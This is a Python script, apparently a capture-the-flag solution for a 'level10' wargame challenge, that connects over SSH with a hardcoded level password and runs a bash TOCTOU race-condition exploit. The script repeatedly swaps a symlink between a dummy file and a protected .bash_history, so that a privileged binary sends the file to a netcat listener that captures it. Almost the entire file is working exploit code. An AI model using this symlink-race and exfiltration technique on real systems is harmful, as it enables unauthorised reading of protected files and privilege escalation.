"""Level 10 TOCTOU Race Condition Exploit - inotifywait method"""

import subprocess
import sys


def main():
    print("[*] Level 10 TOCTOU Race Condition Exploit")
    print("[*] Connecting to VM and running exploit...\n")

    bash_exploit = r"""#!/bin/bash
cd /var/tmp
echo "[*] Cleaning up old files..."
rm -f link dummy /tmp/captured

echo "[*] Creating dummy file..."
touch dummy

echo "[*] Starting netcat listener on port 6969..."
(while true; do nc -l -p 6969 >> /tmp/captured 2>/dev/null; done) &
LISTENER_PID=$!
sleep 1

echo "[*] Starting exploit loop..."
for attempt in {1..2000}; do
  ln -sf dummy link 2>/dev/null
  timeout 1 /home/user/level10/level10 link 127.0.0.1 >/dev/null 2>&1 &

  for i in {1..500}; do
    ln -sf /home/user/level10/.bash_history link 2>/dev/null
  done

  if [ -s /tmp/captured ] && grep -q "woupa2" /tmp/captured 2>/dev/null; then
    echo "[+] SUCCESS on attempt $attempt!"
    break
  fi

  if [ $((attempt % 200)) -eq 0 ]; then
    SIZE=$(wc -c < /tmp/captured 2>/dev/null || echo 0)
    echo "[*] Attempt $attempt/2000, captured: $SIZE bytes"
  fi
done

sleep 1
echo "[*] Killing listener..."
kill $LISTENER_PID 2>/dev/null
wait 2>/dev/null

echo "[*] Checking final results..."
if [ -s /tmp/captured ]; then
  SIZE=$(wc -c < /tmp/captured)
  echo "[*] Captured $SIZE bytes"
  if grep -q "woupa2" /tmp/captured 2>/dev/null; then
    echo "[+] SUCCESS!"
    cat /tmp/captured
    exit 0
  fi
fi

echo "[-] Failed to capture target file"
exit 1
"""

    try:
        with open("level09/flag") as f:
            level10_password = f.read().strip()
    except:
        level10_password = "s5cAJpM8ev6XHw998pRWG728z"

    try:
        ssh_cmd = [
            "sshpass",
            "-p",
            level10_password,
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-p",
            "4242",
            "level10@localhost",
            bash_exploit,
        ]

        print("[*] Starting SSH connection...")
        print("[*] Running TOCTOU race condition exploit on remote VM...")
        print("[*] This may take a minute or two:\n")

        result = subprocess.run(ssh_cmd, text=True, timeout=180)

        if result.returncode == 0:
            return 0
        else:
            return 1

    except subprocess.TimeoutExpired:
        print("[-] Timeout")
        return 1
    except Exception as e:
        print(f"[-] Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
